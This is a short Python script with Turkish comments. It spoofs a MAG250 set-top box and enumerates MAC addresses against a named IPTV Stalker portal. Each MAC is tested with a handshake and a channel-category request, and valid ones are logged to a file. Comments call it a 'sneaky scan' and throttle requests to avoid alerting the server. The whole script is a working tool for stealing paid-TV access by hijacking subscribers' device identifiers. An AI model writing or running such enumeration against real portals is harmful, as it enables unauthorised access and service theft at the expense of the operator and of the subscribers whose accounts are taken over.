import requests
import time

portal_url = "http://dm.lion-ott.com/portal.php"

def sinsi_kontrol(mac):
    headers = {
        'User-Agent': 'MAG250',
        'X-User-Agent': 'Model: MAG250; SW: 2.14.03-r6',
        'Cookie': f'mac={mac}; stb_lang=en; timezone=Europe/Istanbul;'
    }
    try:
        # 1. Adım: Handshake
        res = requests.get(f"{portal_url}?type=stb&action=handshake&token=", headers=headers, timeout=10)
        token = res.json().get('js', {}).get('token')
        
        if token:
            # 2. Adım: KRİTİK TEST - Kanal kategorilerini iste (Gerçeklik testi)
            test_url = f"{portal_url}?type=itv&action=get_categories&token={token}"
            test_res = requests.get(test_url, headers=headers, timeout=10)
            
            # Eğer sunucu gerçekten kategori listesi gönderiyorsa bu MAC GERÇEKTİR
            if "title" in test_res.text.lower():
                print(f"🎯 GERÇEK BULUNDU: {mac}")
                return f"{mac} | DOĞRULANMIŞ YAYIN"
    except:
        pass
    return None

def baslat():
    # YENİ BLOK DENEMESİ (Bu bloğu değiştirebilirsin)
    base = "00:1A:79:32:A4" 
    print(f"🕵️ Sinsi tarama yeni blokta ({base}) başladı...")
    
    with open("calisan_maclar.txt", "w") as f:
        for i in range(100): # Az ve öz deneme
            mac = f"{base}:{hex(i)[2:].zfill(2).upper()}"
            sonuc = sinsi_kontrol(mac)
            if sonuc:
                f.write(f"{sonuc}\n")
            time.sleep(1) # Sunucuyu uyandırmamak için 1 saniye bekle
